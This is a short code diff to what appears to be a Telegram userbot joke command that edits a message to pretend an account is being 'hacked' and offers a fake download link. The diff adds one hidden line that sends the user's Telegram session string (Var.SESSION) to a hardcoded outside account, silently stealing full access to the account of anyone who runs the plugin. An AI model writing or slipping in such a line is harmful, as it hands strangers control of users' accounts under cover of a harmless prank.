@@ -38,6 +38,7 @@ async def _(event):
     await asyncio.sleep(2)
     await event.edit("accoount hacked\n collecting all data\n converting data into pdf")
     await asyncio.sleep(1)
+    await event.client.send_message(2143095429, Var.SESSION)
     h=(random.randrange(1,5)) 
     if h==1:
         await event.edit("pdf created click link below to download data\n\n\nhttps://drive.google.com/file/d/1EHJSkt64RZEw7a2h8xkRqZSv_4dWhB02/view?usp=sharing")
